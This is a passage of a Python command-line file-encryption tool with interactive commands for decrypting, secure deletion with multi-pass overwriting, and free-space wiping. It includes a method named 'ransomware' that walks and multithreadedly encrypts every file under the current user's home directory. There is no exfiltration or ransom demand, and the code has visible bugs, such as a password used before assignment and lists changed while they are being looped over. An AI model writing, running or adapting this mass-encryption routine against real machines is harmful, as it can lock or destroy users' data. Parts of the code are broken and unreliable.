				decryption_arguments = command.replace("decrypt ", "").lower()
				keep_copy = False
				
				if "-c " in decryption_arguments or "--keep-copy " in decryption_arguments:
					keep_copy = True
					
					args1 = decryption_arguments.replace("-c ", '')
					decryption_arguments = args1.replace("--keep_copy ", '')
					
				if "-rw" in decryption_arguments or "--ransomware" in decryption_arguments:
					args1 = decryption_arguments.replace("-rw", "")
					decryption_arguments = args1.replace("--ransomware", "")
					
					dir_list = [
						f"C:\\MyPython\\hmm"
					]
					
					skip_dirs = [
						f"C:\\Users\\{current_user}\\AppData"
					]
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					main.ransomware(
						dir_list,
						skip_directories=skip_dirs,
						verbose=True,
						password=password,
						keep_copy=keep_copy,
						cipher_method="decrypt"
					)
					
					debug_info()
					continue
					
				if "-f " in decryption_arguments or "--file " in decryption_arguments:
					args1 = decryption_arguments.replace("-f ", "")
					argument_files = args1.replace("--file ", "")
					
					files = tokenize(argument_files)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if files:
						main.cipher_file(
							files,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="decrypt"
						)
				if "-dr " in decryption_arguments or "--directory " in decryption_arguments:
					args1 = decryption_arguments.replace("-dr ", "")
					argument_directories = args1.replace("--directory ", "")
					
					directories = tokenize(argument_directories)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if directories:
						main.cipher_directory(
							directories,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="decrypt"
						)
				debug_info()
				
			if "safedel " in command.lower():
				safedel_arguments = command.replace("safedel ", "").lower()
				
				if "-fd" in safedel_arguments or "--fdel" in safedel_arguments:
					args1 = safedel_arguments.replace("-fd", "")
					safedel_arguments = args1.replace("--fdel", "")
					
					confirm = input("Do you wish to continue? This will remove deleted files from your disk. [Y/N]: ")
					
					if confirm.lower() == "y":
						pass
					else:
						print("fdel canceled, returning. . .")
						continue
					
					set_progress_bar = False
					
					symbols = ['\\', '|', '/', '-']
					i = 0
					
					for pass_iteration in range(3):
						interactive[f"freespace_overwrite | pass{pass_iteration + 1}_complete"] = False
				
					current_pass = 1
					
					thread = thread_create(
						callback = freespace_overwrite
					)
					
					total_start_time = time.time()
					start_time = time.perf_counter()
					
					def get_tempfile_size():
						tempfile_size = 0
						
						while not interactive[f"freespace_overwrite | pass3_complete"]:
							if cleanup_status:
								break
							
							try:
								file_stats = os.stat("disk_filler_file.tmp")
								tempfile_size = file_stats.st_size
								
								size_in_gb = float(format(tempfile_size // (1024 * 1024 * 1024)))
								
								sys.stdout.write(f"| current temp file size: {size_in_gb:.2f} GB")
								sys.stdout.flush()
							except ZeroDivisionError:
								pass
							
							time.sleep(0.01)
					
					thread = thread_create(
						callback = get_tempfile_size
					)
					
					while True:
						if cleanup_status:
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . stopped\n\n")
							break
						
						if interactive[f"freespace_overwrite | pass{current_pass}_complete"] == True:
							end_time = time.perf_counter()
							sys.stdout.write(f"\b{' ' for i in range(100)}")
							
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
							
							current_pass += 1
							
							if current_pass == 3:
								break
							
							start_time = time.perf_counter()
							continue
						
						end_time = time.perf_counter()
						
						tempfile_size = 0
						
						elapsed_time = end_time - start_time
						mins, sec = divmod(elapsed_time, 60)
						
						sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . {symbols[i]} | ")
						
						sys.stdout.write(f"time elapsed: {int(mins)} minute{'s' if mins != 1 else ''} ")
						sys.stdout.write(f"{int(sec)} second{'s' if sec != 1 else ''} ")
						
						sys.stdout.flush()
						
						i = (i + 1) % len(symbols)
						time.sleep(0.1)
					
					total_end_time = time.time()
					print(f"total time elapsed for fdel: {(total_end_time - total_start_time):.2f} seconds\n")
					
					continue
				
				files = tokenize(safedel_arguments)
				confirm = input("Do you wish to continue? This process will be irriversible. [Y/N]: ")
				
				if confirm.lower() == "y":
					pass
				else:
					print("safedel canceled, returning. . .")
					continue
				
				print(files)
				
				for current_file, file_to_delete in enumerate(files):
					set_progress_bar = False
					
					symbols = ['\\', '|', '/', '-']
					i = 0
						
					interactive[f"{files[current_file]} | cipher_complete"] = False
					
					for iteration in range(16):
						interactive[f"{files[current_file]} | pass{iteration + 1}_complete"] = False
					
					current_file_size = os.path.getsize(files[current_file])
					
					def call_cipher(cipher_mode="encrypt", *args):
						encrypt_file(*args) if cipher_mode == "encrypt" else decrypt_file(*args)
						
						interactive[f"{files[current_file]} | cipher_complete"]
						
					thread = thread_create(
						callback = cipher,
						cipher_mode = "encrypt",
						input_file = files[current_file], 
						password = os.urandom(64),
						keep_copy = False,
						override_raise=True
					)
					
					total_start_time = time.time()
					
					print(f"\n{files[current_file]}: ")
					start_time = time.perf_counter()
					
					while True:
						if cleanup_status:
							sys.stdout.write(f"\rwaiting for encryption to finish. . . stopped\n\n")
							break
						
						if interactive[f"{files[current_file]} | cipher_complete"] == True:
							end_time = time.perf_counter()
							sys.stdout.write(f"\rwaiting for encryption to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
							
							break
						
						sys.stdout.write(f"\rwaiting for encryption to finish. . . {symbols[i]}")
						i = (i + 1) % len(symbols)
						
						time.sleep(0.1)
					
					thread = thread_create(
						callback = file_overwrite,
						file_path = files[current_file],
						file_size = current_file_size
					)
					
					current_pass = 1
					start_time = time.perf_counter()
					
					while True:
						if cleanup_status:
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . stopped\n\n")
							break
						
						if interactive[f"{files[current_file]} | pass{current_pass}_complete"] == True:
							end_time = time.perf_counter()
							
							sys.stdout.write("\r")
							
							for i in range(100):
								sys.stdout.write(" ")
							
							sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . done [finished in {(end_time - start_time):.2f} seconds]\n\n")
							
							current_pass += 1
							
							if current_pass == 17:
								break
							
							start_time = time.perf_counter()
							continue
						
						end_time = time.perf_counter()
						
						tempfile_size = 0
						
						elapsed_time = end_time - start_time
						mins, sec = divmod(elapsed_time, 60)
						
						i = (i + 1) % len(symbols)
						
						sys.stdout.write(f"\rwaiting for pass {current_pass} to finish. . . {symbols[i]} | ")
						
						sys.stdout.write(f"time elapsed: {int(mins)} minute{'s' if mins != 1 else ''} ")
						sys.stdout.write(f"{int(sec)} second{'s' if sec != 1 else ''} ")
						
						sys.stdout.flush()
						
						time.sleep(0.1)
					
					total_end_time = time.time()
					print(f"total time elapsed for {files[current_file]}: {(total_end_time - total_start_time):.2f} seconds\n")
					print(worker_errors)
			...

	def parse_args(self):
		main = Main()
		
		self.args = self.parser.parse_args()
		
		# Guard clauses
		if self.args.interactive:
			while not cleanup_status:
				try:
					pycrypter_interactive()
				except Exception as err:
					err_name = type(err).__name__
					
					print(f"An unexpected error occured! Details: \n")
					traceback.print_exc()
			
			return
		
		if self.args.threads:
			threads_max(args.threads)
		
		if self.args.encrypt and self.args.decrypt:
			raise ArgumentError("Both encryption and decryption switches cannot be enabled!\nType -h/--help for help.")

		if not self.args.encrypt and not self.args.decrypt:
			raise ArgumentError("Neither encryption nor decryption switches aren't specified!\nType -h/--help for help.")
		
		atexit.register(debug_info)
		
		if self.args.ransomware:
			cipher_method = "encrypt" if self.args.encrypt else "decrypt"
			
			main.ransomware(
				f"C:\\Users\\{current_user}",
				verbose=self.args.verbose,
				password=password,
				keep_copy=self.args.keep_copy,
				cipher_method=cipher_method
			)
			sys.exit()

		if self.args.file is None and self.args.directory is None:
			raise ArgumentError("No file/directory specified!\nType -h/--help for help.")
		
		password = getpass.getpass("Enter a password: ")
		
		cipher_method = "encrypt" if self.args.encrypt else "decrypt"
		
		sys.stdout.write("|-------------------------------------------------------------|\n")
		sys.stdout.flush()
		
		if self.args.file:
			main.cipher_file(
				self.args.file,
				verbose=self.args.verbose,
				password=password,
				keep_copy=self.args.keep_copy,
				cipher_method=cipher_method
			)
		
		if self.args.directory:
			main.cipher_directory(
				self.args.directory,
				verbose=self.args.verbose,
				password=password,
				keep_copy=self.args.keep_copy,
				cipher_method=cipher_method
			)
	
	def ransomware(self, directories, skip_directories=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		global files_count
		global files_finished
		global files_exception_thrown
		
		global bar_total
		
		if cipher_method not in ["encrypt", "decrypt"]:
			raise ValueError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
		
		files = []
		folders = []
		files_errorlist = []
		
		for folder in directories:
			if find_dir(folder):
				folders.append(folder)
				continue
			
			if os.path.isfile(folder):
				dir_errors.append(f"-rw | Directory \"{folder}\" is a file!")
			elif len(directories) > 1:
				# Don't throw an error for mass searching
				dir_errors.append(f"-rw | Directory \"{folder}\" isn't a directory!")
			else:
				# Throw an error if less than two directories are being processed
				dir_errors.append(f"-rw | Directory \"{folder}\" isn't a directory!")

				raise NotADirectoryError(f"Directory \"{folder}\" isn't a directory!")
		
		for i, folder in enumerate(folders):
			files = iterate_dir(folder, iterate_tree=True, skip_dirs=skip_directories)

		for i, file in enumerate(files):
			files_count += 1

			file_name, file_ext = os.path.splitext(file)
			file_size = os.path.getsize(file)

			if file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | Binary file")
				files.remove(file)
				continue
			elif file_size > memory_max_allocated:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | File too large")
				files.remove(file)
				continue

		bar_total = files_count
		
		for i, file in enumerate(files):
			if cleanup_status:
				break

			if cipher_method == "encrypt":
				thread = thread_create(
					callback = encrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)
			elif cipher_method == "decrypt":
				thread = thread_create(
					callback = decrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)
		
		while len(threads) > 0:
			time.sleep(0.05)

			if cleanup_status:
				break

		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
			print(f"Total files [processed] : {files_finished}\n")

			print(f"Total: {files_count} | Completed: {files_finished} | Error thrown: {files_exception_thrown}\n")

			print(f"Extra information: \nfiles_count: {files_count} | len(files): {len(files)}")
			print(f"files_finished: {files_finished} | files_finished == files_count: {files_finished == files_count}\n")

			# File and directory errors
			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
			print(f"{Fore.LIGHTGREEN_EX}File errorlist: (-dr){Style.RESET_ALL}\n")

			for err in files_errorlist:
				print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
				print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	
	# Check each file/directory
	def cipher_file(self, file_list, skip_files=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		global files_count
		global files_finished
		global files_exception_thrown
		
		global bar_total
		
		if cipher_method not in ["encrypt", "decrypt"]:
			raise ValueError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
		
		files = []
		files_errorlist = []

		for file in file_list:
			if find_file(file):
				files.append(file)
				continue

			if os.path.isdir(file):
				file_errors.append(f"-f | File \"{file}\" is a directory!")
			elif len(files) > 1:
				print(f"Error: expected valid file path, got {file}")
			else:
				raise FileNotFoundError(f"File \"{file}\" isn't a file!")

		for i, file in enumerate(files):
			files_count += 1

			file_name, file_ext = os.path.splitext(file)
			file_size = os.path.getsize(file)

			if file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | Binary file")
				files.remove(file)
				continue
			elif file_size > memory_max_allocated:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | File too large")
				files.remove(file)
				continue

		bar_total = files_count
		for i, file in enumerate(files):
			if cleanup_status:
				break

			if cipher_method == "encrypt":
				thread = thread_create(
					callback = encrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)
			elif cipher_method == "decrypt":
				thread = thread_create(
					callback = decrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)

		while len(threads) > 0:
			time.sleep(0.05)

			if cleanup_status:
				break

		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
			print(f"Total files [processed] : {files_finished}\n")

			print(f"Total: {files_count} | Completed: {files_finished} | Error thrown: {files_exception_thrown}\n")

			print(f"Extra information: \nfiles_count: {files_count} | len(files): {len(files)}")
			print(f"files_finished: {files_finished} | files_finished == files_count: {files_finished == files_count}\n")

			# File and directory errors
			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
			print(f"{Fore.LIGHTGREEN_EX}File errorlist: (-dr){Style.RESET_ALL}\n")

			for err in files_errorlist:
				print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
				print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")

	def cipher_directory(self, directories, skip_directories=[], verbose=True, password="", keep_copy=False, cipher_method="encrypt"):
		global files_count
		global files_finished
		global files_exception_thrown
		
		global bar_total
		
		if cipher_method not in ["encrypt", "decrypt"]:
			raise ValueError(f'cipher_method expected "encrypt" or "decrypt", got {cipher_method}')
		
		files = []
		files_errorlist = []

		for folder in directories:
			if find_dir(folder):
				folders.append(folder)
				continue

			if os.path.isfile(folder):
				dir_errors.append(f"-dr | Directory \"{folder}\" is a file!")
			elif len(directories) > 1:
				# Don't throw an error for mass searching
				dir_errors.append(f"-dr | Directory \"{folder}\" isn't a directory!")
			else:
				# Throw an error if less than two directories are being processed
				dir_errors.append(f"-dr | Directory \"{folder}\" isn't a directory!")

				raise NotADirectoryError(f"Directory \"{folder}\" isn't a directory!")

		for i, folder in enumerate(folders):
			files = iterate_dir(folder, args.deep_search)

		for i, file in enumerate(files):
			files_count += 1

			file_name, file_ext = os.path.splitext(file)
			file_size = os.path.getsize(file)

			if file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | Binary file")
				files.remove(file)
				continue
			elif file_size > memory_max_allocated:
				files_exception_thrown += 1

				files_errorlist.append(file_name + file_ext + " | File too large")
				files.remove(file)
				continue

		bar_total = files_count
		for i, file in enumerate(files):
			if cleanup_status:
				break

			if cipher_method == "encrypt":
				thread = thread_create(
					callback = encrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)
			elif cipher_method == "decrypt":
				thread = thread_create(
					callback = decrypt_file, 
					input_file = file, 
					password = password,
					keep_copy = keep_copy
				)

		while len(threads) > 0:
			time.sleep(0.05)

			if cleanup_status:
				break

		if verbose:
			print(f"\n|-------------------------------------------------------------|\n\nTotal files : {files_count}")
			print(f"Total files [processed] : {files_finished}\n")

			print(f"Total: {files_count} | Completed: {files_finished} | Error thrown: {files_exception_thrown}\n")

			print(f"Extra information: \nfiles_count: {files_count} | len(files): {len(files)}")
			print(f"files_finished: {files_finished} | files_finished == files_count: {files_finished == files_count}\n")

			# File and directory errors
			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
			print(f"{Fore.LIGHTGREEN_EX}File errorlist: (-dr){Style.RESET_ALL}\n")

			for err in files_errorlist:
				print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
				print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

			print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
		
if __name__ == "__main__":
	main = Main()
	main.parse_args()
